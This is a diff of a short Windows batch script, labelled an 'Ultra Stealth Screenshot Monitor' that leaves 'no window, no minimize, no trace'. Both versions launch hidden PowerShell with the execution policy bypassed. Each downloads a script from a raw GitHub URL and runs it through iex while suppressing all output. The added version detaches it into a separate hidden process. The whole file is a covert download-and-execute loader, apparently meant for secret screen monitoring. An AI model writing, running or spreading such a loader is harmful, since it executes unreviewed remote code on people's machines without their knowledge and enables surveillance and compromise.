@@ -1,16 +1,13 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal
 
-REM =============================================
-REM Ultra Silent Screenshot Monitor
-REM =============================================
+:: Ultra Stealth Screenshot Monitor
+:: No window, no minimize, no trace
 
-set "a=https://raw.githubusercontent.com"
-set "b=/Axolotl-in-void/powerhell/main/file.ps1"
-set "url=%a%%b%"
+set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"
 
-:: Run completely hidden with no window ever appearing
+:: Run completely hidden and detached
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"$c = (iwr '%url%' -UseBasicParsing).Content; iex $c" >nul 2>&1
+"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"$content = (Invoke-WebRequest ''%url%'' -UseBasicParsing).Content; iex $content\"' -WindowStyle Hidden -NoNewWindow" >nul 2>&1
 
 exit
